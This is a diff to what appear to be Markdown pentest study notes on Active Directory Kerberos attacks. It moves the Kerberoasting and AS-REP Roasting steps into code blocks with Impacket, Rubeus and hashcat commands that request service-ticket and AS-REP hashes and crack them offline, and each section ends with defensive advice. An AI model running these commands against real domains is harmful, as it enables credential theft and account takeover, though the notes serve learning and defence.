@@ -11,17 +11,36 @@ Kerberos is the default AD auth protocol; most privilege-escalation paths abuse 
 ## Kerberoasting
 
 - **Idea:** any domain user can request a TGS for any account that has an **SPN**. The TGS is encrypted with the service account's password hash → crack it offline. No special privileges needed.
-- **Enumerate:** `Get-NetUser -SPN` or `GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc>`.
-- **Request + extract:** `GetUserSPNs.py ... -request` (Linux) or Rubeus `kerberoast` (Windows).
-- **Crack offline:** `hashcat -m 13100 hashes.txt wordlist`.
-- **Why it works:** service accounts often have weak, non-expiring passwords. Prefer AES over RC4 tickets when both are offered (RC4 = mode 13100).
+- **Why it works:** service accounts often have weak, non-expiring passwords. Prefer AES over RC4 when both are offered.
+
+```bash
+# From Linux (Impacket): list SPNs, then request the tickets
+GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc>
+GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc> -request -outputfile kerb.hashes
+
+# Crack offline (RC4 = mode 13100, AES = 19600/19700)
+hashcat -m 13100 kerb.hashes wordlist.txt
+```
+
+```powershell
+# From Windows
+Rubeus.exe kerberoast /outfile:kerb.hashes
+```
+
 - **Defense:** gMSA (auto-rotated 120-char passwords), long passwords on service accounts, AES-only, alert on 4769 with RC4 for many SPNs.
 
 ## AS-REP Roasting
 
 - **Idea:** accounts with **"Do not require Kerberos pre-authentication"** set will hand out an AS-REP encrypted with the user's hash *without* proving identity → crack offline.
-- **Enumerate:** `Get-NetUser -PreauthNotRequired` or `GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc>`.
-- **Crack:** `hashcat -m 18200 hashes.txt wordlist`.
+
+```bash
+# Request AS-REP hashes for users without pre-auth (Impacket)
+GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc> -no-pass -format hashcat -outputfile asrep.hashes
+
+# Crack offline
+hashcat -m 18200 asrep.hashes wordlist.txt
+```
+
 - **Defense:** remove the pre-auth exemption, strong passwords, monitor 4768 with pre-auth = 0.
 
 ## Delegation abuse
